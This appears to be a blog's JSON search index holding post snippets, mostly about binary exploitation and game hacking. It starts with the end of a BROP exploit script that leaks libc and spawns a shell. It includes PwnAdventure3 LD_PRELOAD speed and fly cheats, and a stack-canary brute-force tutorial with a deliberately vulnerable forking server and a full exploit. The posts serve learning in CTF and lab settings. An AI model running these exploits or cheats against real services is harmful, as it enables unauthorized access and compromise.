b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(BINARY_BASE) payload += pwn.p64(i) io.send(payload) mssg = io.recv(0x1000, timeout=0.2) if b&#39;ELF&#39; in mssg: pwn.log.success(&quot;Found leak func at: &quot; + hex(i)) funcs.append(i) io.close() return funcsdef LeakELF(): f = open(&#39;leak.elf&#39;, &#39;wb&#39;) offset = BINARY_BASE while(offset &amp;lt; BINARY_BASE + 0x4000): pwn.log.info(&quot;At offset: &quot; + hex(offset)) io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(offset) payload += pwn.p64(CALL_PUTS) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall().strip() print(hex(pwn.unpack(mssg, &#39;all&#39;))) if len(mssg) == 0: f.write(b&#39;\\x00&#39;) offset += 1 else: f.write(mssg) offset += len(mssg) io.close() f.flush()def LeakGOT(): for i in range(0x600000, 0x600000+0x4000, 8): io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(i) payload += pwn.p64(CALL_PUTS) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall().strip() if b&#39;\\x7f&#39; in mssg: pwn.log.success(&quot;Found Possible GOT at: &quot; + hex(i)) io.close() io.close()def scanQWORD(l): for x in l: io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(x) payload += pwn.p64(CALL_PUTS) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall().strip() mssg = mssg[0:8] mssg = pwn.unpack(mssg, &#39;all&#39;) pwn.log.success(&quot;QWORD @ Memory -&quot; + hex(x) + &quot;: &quot; + hex(mssg)) io.close()def exploit(): io = pwn.remote(HOST, PORT) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(PUTS_GOT) payload += pwn.p64(CALL_PUTS) payload += pwn.p64(LOOPBACK_FUNC) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) leak = io.recvline().strip() leak = pwn.unpack(leak, &#39;all&#39;) pwn.log.success(&quot;Puts Leak: &quot; + hex(leak)) libc.address = leak - libc.symbols[&#39;puts&#39;] pwn.log.success(&quot;Libc Address: &quot; + hex(libc.address)) io.recvuntil(b&quot;?\\n&quot;) binsh = next(libc.search(b&#39;/bin/sh\\0&#39;)) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(binsh) payload += pwn.p64(libc.sym[&#39;system&#39;]) io.send(payload) io.interactive()if __name__ == &quot;__main__&quot;: # len = GetRipOffset() # print(BruteRip()) # ScanText() # print(FindBropGadget()) # CheckBROP() # print(FindLeakFunc()) # LeakELF() # LeakGOT() #scanQWORD([0x600000, 0x600288, 0x600ef0, #0x601010, 0x601018, 0x601020, 0x601028, 0x601030, 0x601038, 0x601070, 0x601080]) exploit() # Test()" }, { "title": "PwnAdventure Part5 - More Hacks!!", "url": "/posts/pwn-adventure-part5/", "categories": "Pwn", "tags": "pwn, game hacking, LD_PRELOAD, dlsym", "date": "2022-02-10 16:48:00 +0530", "snippet": "Developing More HacksIn the previous post I went over LD_PRELOAD to hijack functions and created the speed hack. In this post I’m going over and understanding other hacks that LiveOverflow made i.e fly hack and teleportation hack.Creating our Fly HackLike the previous hack we can just hook the World::tick() function access the global GameWorld variable and edit m_jumpSpeed and m_jumpHoldTime of our player object to create a sort of fly hack.#include &quot;libGameLogic.h&quot;#include &amp;lt;set&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;#include &amp;lt;map&amp;gt;#include &amp;lt;functional&amp;gt;#include &amp;lt;string&amp;gt;#include &amp;lt;cstring&amp;gt;#include &amp;lt;vector&amp;gt;#include &amp;lt;cfloat&amp;gt;#include &amp;lt;memory&amp;gt;#include &amp;lt;stdint.h&amp;gt;bool Player::CanJump(){ return 1;}void World::Tick(float f){ ClientWorld* world = *((ClientWorld**)(dlsym(RTLD_NEXT, &quot;GameWorld&quot;))); IPlayer* iplayer = world-&amp;gt;m_activePlayer.m_object; Player* player = ((Player*)(iplayer)); player-&amp;gt;m_walkingSpeed = 99999; player-&amp;gt;m_jumpSpeed = 999; player-&amp;gt;m_jumpHoldTime = 99999;}" }, { "title": "PwnAdventure Part4 - Function Hijacking", "url": "/posts/pwn-adventure-part4/", "categories": "Pwn", "tags": "pwn, game hacking, LD_PRELOAD, dlsym", "date": "2022-01-27 12:02:00 +0530", "snippet": "Developing our First HackIn this post I’m going over our first step to develop a hack. The way we are going to do it is we are going to overwrite functions in the libGameLogic.so by writing our own library and the LD_PRELOAD in it. This is why we built the header file to get the correct offsets of objects and getting the function definitions.Testing LD_PRELOADLet’s test our LD_PRELOAD function hooking by hooking a simple function and console logging the output. So what we’re going to do is hook the Player::SetJumpState(bool b) function and just outputing the value of b to check if we are able to hook the function.#include &quot;libGameLogic.h&quot;#include &amp;lt;set&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;#include &amp;lt;map&amp;gt;#include &amp;lt;functional&amp;gt;#include &amp;lt;string&amp;gt;#include &amp;lt;cstring&amp;gt;#include &amp;lt;vector&amp;gt;#include &amp;lt;cfloat&amp;gt;#include &amp;lt;memory&amp;gt;#include &amp;lt;stdint.h&amp;gt;void Player::SetJumpState(bool b){ printf(&quot;[*] SetJumpState(%d)\\n&quot;,b);}This is how we are going to hook the function and check the value. We have to be careful how we compile it as we have to compile it a shared library and make it position independant.g++ jumpHook.cpp -std=c++11 -shared -o myLib.so -fPICHere -shared is to signify that we want it to be compiled as a shared object file and -fPIC so that it is position independant. Keep in mind that we are overwriting the function body entirely and not calling the functions being called after this i.e we are not sending the server information that we are jumping so we would only be jumping in our client and would’nt appear to be jumping to others.Our Target FunctionSince we know that we can hook any function we’ll search for a function which is kinda useless and can be called upon easily. Liveoverflow finds the function World::tick(float f). We can hook this and see what argument it is getting.#include &quot;libGameLogic.h&quot;#include &amp;lt;set&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;#include &amp;lt;map&amp;gt;#include &amp;lt;functional&amp;gt;#include &amp;lt;string&amp;gt;#include &amp;lt;cstring&amp;gt;#include &amp;lt;vector&amp;gt;#include &amp;lt;cfloat&amp;gt;#include &amp;lt;memory&amp;gt;#include &amp;lt;stdint.h&amp;gt;void World::Tick(float f){ printf(&quot;[tick] %0.2\\n&quot;,f);}After hooking the function we see that its just a normal tick function and is being executed quite freqeuently about 2 times per sec.Enter DlsymSince now we can overwrite functions lets see how we can write data in .bss of the other libraries. We will use the dlsym function. This takes 2 arguments a handle and a symbol. The handle is for any open dynamic library and symbol is the symbol whose address we want. for the handle we will use the special argument RTLD_NEXT which finds the next occurence of the symbol.We’ll use dlsym to find the address of the GameWorld object which we saw was a global variable in the .bss.Getting our Player ObjectFor this part we would have to look at the classes in depth and see the relations between them. So I just followed Liveoverflow’s example of how we got to the player object from the GameWorld object. Just as how he did we’re going to get our Player object and try to print our name and mana.#include &quot;libGameLogic.h&quot;#include &amp;lt;set&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;#include &amp;lt;map&amp;gt;#include &amp;lt;functional&amp;gt;#include &amp;lt;string&amp;gt;#include &amp;lt;cstring&amp;gt;#include &amp;lt;vector&amp;gt;#include &amp;lt;cfloat&amp;gt;#include &amp;lt;memory&amp;gt;#include &amp;lt;stdint.h&amp;gt;void World::Tick(float f){ ClientWorld *world = *((ClientWorld **)(dlsym(RTLD_NEXT,&quot;GameWorld&quot;))); IPlayer *iplayer = world-&amp;gt;m_activePlayer.m_object; printf(&quot;[LO] IPlayer-&amp;gt;GetPlayerName: %s\\n&quot;,iplayer-&amp;gt;GetPlayerName()); Player *player = ((Player *)(iplayer)); printf(&quot;[LO] player-&amp;gt;m_mana: %d\\n&quot;,player-&amp;gt;m_mana);}We see that this function updates frequently giving us sort of a live update each time we use our mana.Our First HackWe’ll use this player object to increase our player speed and get our speed hack! Somehow the server trust the client in the position it provides and our speed hack is visible to other players as well.#include &quot;libGameLogic.h&quot;#include &amp;lt;set&amp;gt;#include &amp;lt;dlfcn.h&amp;gt;#include &amp;lt;map&amp;gt;#include &amp;lt;functional&amp;gt;#include &amp;lt;string&amp;gt;#include &amp;lt;cstring&amp;gt;#include &amp;lt;vector&amp;gt;#include &amp;lt;cfloat&amp;gt;#include &amp;lt;memory&amp;gt;#include &amp;lt;stdint.h&amp;gt;void World::Tick(float f){ ClientWorld *world = *((ClientWorld **)(dlsym(RTLD_NEXT,&quot;GameWorld&quot;))); IPlayer *iplayer = world-&amp;gt;m_activePlayer.m_object; Player *player = ((Player *)(iplayer)); player-&amp;gt;m_walkingSpeed = 99999;}" }, { "title": "PwnAdventure Part3 - Memory and Structs", "url": "/posts/pwn-adventure-part3/", "categories": "Pwn", "tags": "pwn, game hacking, gdb, c++, reversing", "date": "2022-01-23 16:28:00 +0530", "snippet": "What we’re going to doNow that we have an overview of the game lets load the libGameLogic library in a disassembler. I’m using IDA for this. Since we have debug information we’ll get all the classes,structs and functions in a headerfile so that we can use the offsets properly. This is very important because I tried without getting the classes and it was just tedious.DisassemblyIf we open the libGameLogic.so file in IDA we see that IDA automatically demangles all the function names for us.Let’s also look at the data segment of the library for some global variables which can be used later.FunctionsLet’s look at the Functions that could be called when we jump. We’ll set a breakpoint on the function to later to see if it was called.We see that there is a function which gives the server information about jumping and this action is added to a server queue.GDBWe need sudo privileges to attach to our game client. We can attach to the process using the command -sudo gdb -p $(pidof ./PwnAdventure3-Linux-Shipping)Then run the command to set a breakpoint on GameServerConnection::Jump(bool) and jump in game to trigger the breakpoint.From the backtrace we are also able to see the functions called before this which lead to this being called.Getting Classes and StructsNow to get the classes and structs which will make our life easier when exploiting to hook function and get offsets in classes and structsWhat we’ll do is use the pytpe command to get information about classes and structs.We can also inspect Global Variables in memory which we can use later.Header FileWe can extract all the classes and structs to get all definations and build a header file through which we’ll compiler our exploit. I tried to build the header myself but was’nt successful. LiveOverflow faced the same issue as me and solved the problem and made the header file for us. here" }, { "title": "PwnAdventure Part2 - Recon", "url": "/posts/pwn-adventure-part2/", "categories": "Pwn", "tags": "pwn, game hacking, wireshark", "date": "2022-01-20 12:15:00 +0530", "snippet": "ReconWhat we’ll be going over in this post is external recon of the game. What I mean by external recon is just getting and overview of how the game is working without going in detail and finding entry points for exploiting.In the Previous PostWe set up the game server and game client for both windows and linux in the previous post. One error that you might face which I faced was libssl and libcrypto was missing the game currently uses an older version of this library and I had to install it separately. linkLibrariesLets start first by looking the dynamic libraries linked with the game binary through the ld command.We see many common libraries which are being used. There is libpthread which is used for threading. There is a custom libGameLogic library which might be useful. Using the file command on libGameLogic we see -The file has debug information which makes our life a lot easier. Looking at the other libraries we see libcrypto and libssl which might be used for encryption and TLS.Process OverviewLet’s look at the process in Linux. Each process has a pid (process id). Lets see the process in pstree to see its child process and threads.Here we see all of the threads and their pids as well all of these components must be handling some sort of functionality./proc/pidThe /proc is a a special directory which contains information about running processes. First we’ll grab the pid through the command -ps aux | grep -i pwnThen change the directory to /proc/pid you’ll see something like this in the directory.Here the files represent different information about the process. E.g cmdlineshows the cmdline arguments for running the process, maps show the virtual memory mapping of different libraries,stack,heap etc,the fd folder has info about the open file descriptors,environ has information about the environment variables.Upon inspecting the fd directory we see that there are standard file descriptors open like STDIN,STDOUT,STDERR etc and also file descriptors for packed textures and models.NetworkLets check the network side of things with the command -netstat -ac | grep &quot;pwn&quot;We see that there are 2 repeating connections to master.pwn3:3333 and master.pwn3:3000 where the second connection is essentially to game.pwn3:3000 as its connecting to the game server and thats the hostname we gave it.Master ServerLets see the packets sent to the master server when the game starts. So we’ll check the packets sent to port 3333 on wireshark.We see TLS as the protocol which must have been used for the certificate for secure communication between the master server and our client. We see strings like ghostintheshellcode which is the name of the organizer.Game ServerLets see the packets sent to the game server on port 3000 for me. We constantly see packets being exchanged between the server. There are 2 things to see.First, When we move we see a special string mv in the packets.Second, When we jump we see a special string jmp in the packets." }, { "title": "PwnAdventure Part1 - Setup", "url": "/posts/pwn-adventure-part1/", "categories": "Pwn", "tags": "pwn, game hacking, setup", "date": "2022-01-19 12:02:00 +0530", "snippet": "What is this series about ?I recently came across LiverOverflow’s youtube series on PwnAdventure3. I got interested in this because it involves game hacking which I think is very cool. Please note that this series will not be different from that of LiveOveflow’s and this blog is just a recording of my journey. I hope you enjoy it!What is PwnAdventure ?PwnAdventure is a MMORPG which is intentionally vulnerable to hacks and this was made for a CTF which I think is really cool. It was originally made for education game developers about vulnerabilities found in video games.Setup Originally the game server was hosted by the organizers during the time of the CTF but it is currently down so I decided to host it on my own server. I followed the same steps as LiveOverflow in this video Among all the options he shows I chose to create a droplet on DigitalOcean and used Docker to run the server from the same git repository that LiveOverflow uses.Exact Steps I registered an account on DigitalOcean using a referral link to get 100$ in credits for free. You can use this link to get yourselves 100$ too. Then I created a droplet on DigitalOcean with the following specifications: Name: pwn3 Region: Bangalore Memory: 4GB Image: Ubuntu 20.04 CPU: 2 vCPU Disk: 80GB Monitoring: on Cost: $24/month Authentication: SSH After creating the droplet I was given the IP address of the droplet. I SSHed into the droplet as root. I then followed the instructions for installation as mention in this repository and installed the server. I then started the server by running the command - docker-compose up -d to run the server in detached mode. I came across and error while installing which was bind source path does not exist: ./postgres-data which is also mentioned in this issue here. It is essentially solved by creating a directory postgres-data. Installing Game Client on WindowsFor installing the game client of windows download the client files from here and extract it.Edit the C:\\Windows\\System32\\drivers\\etc\\hosts file (with admin privileges) and add the following lines:IP.IP.IP.IP master.pwn3IP.IP.IP.IP game.pwn3Here replace the IP.IP.IP.IP with the IP address of the droplet.Now open the server.ini file which is in the game folder and change it to:[MasterServer]Hostname=master.pwn3Port=3333[GameServer]Hostname=Port=3000Username=Password=The server has been configured now open the game and register yourself. After registering you get a team hash which can be used to join your team by other players.Installing Game Client on LinuxFor installing the game client of linux download the client files from here and extract it.Edit the /etc/hosts file (with root priviliges) and add the following lines:IP.IP.IP.IP master.pwn3IP.IP.IP.IP game.pwn3Here replace the IP.IP.IP.IP with the IP address of the droplet.Now open the server.ini file which is in the game folder and change it to:[MasterServer]Hostname=master.pwn3Port=3333[GameServer]Hostname=Port=3000Username=Password=The server has been configured now open the game and register yourself. After registering you get a team hash which can be used to join your team by other players." }, { "title": "Bypass Canary in a Network Forking Service", "url": "/posts/fork-leak-canary/", "categories": "Pwn", "tags": "pwn, fork, bof", "date": "2022-01-19 10:05:00 +0530", "snippet": "How to Bypass Stack Canary in a Network Forking ServiceWhat is a Stack Canary ? Stack Canary is a mitigation introduced to prevent buffer overflows. It is a random value placed on the stack which changes each time the program is executed. It is usually placed right before the base pointer and just before the function exits the value of the canary is checked. If the value of the canary is altered, the program exits else the function cleanly returns.Stucture of a Stack Canary Stack Canary is made up of 8 bytes where in the 1st byte is a null byte and the rest of them are random bytes i.e anything from 0x0 to 0xff The reason the first byte is a null byte is because some functions like puts() keep on outputting data on the stack until they hit a null byte so since the first byte is a null byte function like puts cant leak the canary accidentlyTarget Program#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;sys/socket.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;netinet/in.h&amp;gt;#include &amp;lt;arpa/inet.h&amp;gt;#define PORT 4444void win(){ system(&quot;/bin/sh&quot;);}void challenge(){ char buf[64]; memset(buf, 0, sizeof(buf)); puts(&quot;Please enter then length of your name: &quot;); int length; scanf(&quot;%lu&quot;, &amp;amp;length); puts(&quot;Please enter your name: &quot;); read(0, buf, length); return;}int main(){ int sockfd, ret; struct sockaddr_in serverAddr; int newSocket; struct sockaddr_in newAddr; socklen_t addr_size; char buffer[1024]; pid_t childpid; sockfd = socket(AF_INET, SOCK_STREAM, 0); if (sockfd &amp;lt; 0) { printf(&quot;[-]Error in connection.\\n&quot;); exit(1); } printf(&quot;[+]Server Socket is created.\\n&quot;); memset(&amp;amp;serverAddr, &#39;\\0&#39;, sizeof(serverAddr)); serverAddr.sin_family = AF_INET; serverAddr.sin_port = htons(PORT); serverAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); ret = bind(sockfd, (struct sockaddr *)&amp;amp;serverAddr, sizeof(serverAddr)); if (ret &amp;lt; 0) { printf(&quot;[-]Error in binding.\\n&quot;); exit(1); } printf(&quot;[+]Bind to port %d\\n&quot;, 4444); if (listen(sockfd, 10) == 0) { printf(&quot;[+]Listening....\\n&quot;); } else { printf(&quot;[-]Error in binding.\\n&quot;); } while (1) { newSocket = accept(sockfd, (struct sockaddr *)&amp;amp;newAddr, &amp;amp;addr_size); if (newSocket &amp;lt; 0) { exit(1); } printf(&quot;Connection accepted from %s:%d\\n&quot;, inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port)); if ((childpid = fork()) == 0) { break; } wait(0); } dup2(newSocket, 0); dup2(newSocket, 1); dup2(newSocket, 2); challenge(); return 0;} complied with gcc server.c -o server . So, mitigations like PIE,ASLR are present and the stack is not executable which means ret2shellcode is not possible.Understanding the codeFrom the code we can see that the program is a network service which forks itself on each connection and then executes the challenge function. The challenge function itself has a buffer overflow vulnerability which we will abuse.Reversing the programOpen the program in your favourite disassembler and look at the challenge function.we see that we can read an arbitrary amount of bytes based upon our input into the buffer stored at rbp - 0x50. The stack canary is usually located at rbp-0x8. Therefore we would have to overwrite 72 bytes to reach the canary and further 8 bytes to overwrite it and then 8 bytes again to overwrite the base pointer and the 8 bytes again to overwrite the return address.ExploitationThe great thing about fork() is that the memory layout doesn’t change which also means that in such a forking service the canary will always remains fixed once the program starts executing. So our first step would be to brute force the canary. Fill the stack with garbage upto the stack canary Overwrite the next byte with a non null byte and see that the program terminates with the message ***stack smashing detected*** Instead of a non null byte input a null byte and see that the program doesnt crash anymore. It does’nt crash because the first byte of the canary is always a null byte and since we overwrote it with a null byte the canary itself did’nt get changed and the program did not crash. Similarly brute force the entrire canary by sending bytes with values ranging from 0x00 to 0xff until the program does’nt crash. The bytes which were responsible for not crashing the program together combined are the canary.Our next step will be to overwrite the return address to point to the win function We first overwrite the base pointer with some garbage. We know that the function will return back to main. So the return address can be expressed as PIE base + some offset in the code section Since our win function also lies in the code function we know its offset as well Since memory pages are aligned to 0x1000 bytes we therfore know the last 3 nibbles of the win function correctly (you can get this offset from objdump or some decomplier as well) However while sending input we cant sent nibble so we have to send 2 bytes and brute force the missing nibble Bruteforcing will be easy as there are only 16 values that a nibble can take. We check that if we have spawned a shell be simply sending a echo command and checking its output.Full Exploit Code#!/usr/bin/python3import pwn # import pwntoolspwn.context.log_level = &#39;CRITICAL&#39;canary = b&quot;&quot;def leak_canary(canary): for i in range(8): # loop 8 times for 8 bytes of a canary for j in range(256): # loop 256 times for all possible values of a byte # create a connection to localhost:4444 io = pwn.remote(&quot;127.0.0.1&quot;, 4444) # buf is at rbp-0x50 and canary is at rbp-0x8 # so we write 72 bytes of garbage + 8 byte canary io.recv() payload1 = b&quot;80&quot; # send size io.sendline(payload1) io.recv() # send payload payload2 = b&quot;A&quot;*72 payload2 += canary payload2 += pwn.p8(j) io.send(payload2) mssg = io.clean() # check if canary corrupted if b&quot;stack&quot; not in mssg: # Append byte found to canary canary += pwn.p8(j) print(f&quot;[+] Canary - {hex(pwn.unpack(canary,&#39;all&#39;))}&quot;) io.close() break io.close() return canarycanary = pwn.u64(leak_canary(canary))print(&quot;[!] Canary Leaked - &quot;, hex(canary))rbp = b&quot;A&quot;*8canary = pwn.p64(canary)def brute_win_func(rbp, canary): for i in range(16): print(f&quot;Trying {i}&quot;) io = pwn.remote(&quot;127.0.0.1&quot;, 4444) io.recv() payload1 = b&quot;90&quot; # send size io.sendline(payload1) io.recv() # 00000000000013c9 &amp;lt;win&amp;gt;: ret_addr = pwn.p8(0xc9) # the fixed byte # the byte whose nibble we have to bruteforce ret_addr += pwn.p8(i*16+0x3) payload2 = b&quot;A&quot;*72 payload2 += canary payload2 += rbp payload2 += ret_addr io.send(payload2) # echo command to check if we have shell command = b&quot;echo hello\\n&quot; io.sendline(command) mssg = io.clean() if b&quot;hello&quot; in mssg: # drop into interactive shell session io.interactive() io.close()brute_win_func(rbp, canary)Exploit in Action -" }, { "title": "First Test Post", "url": "/posts/First-Post/", "categories": "Personal", "tags": "personal, pwn", "date": "2021-12-27 19:21:00 +0530", "snippet": "WelcomeHello world, this is my first Jekyll blog post.I hope you like it!key: valueconsole.log(&quot;Hello World!&quot;);#include&amp;lt;stdio.h&amp;gt;int main(){ int a = 5; printf(&quot;%d&quot;,a);}{% if product.title contains &#39;Pack&#39; %} This product&#39;s title contains the word Pack.{% endif %}" } ]
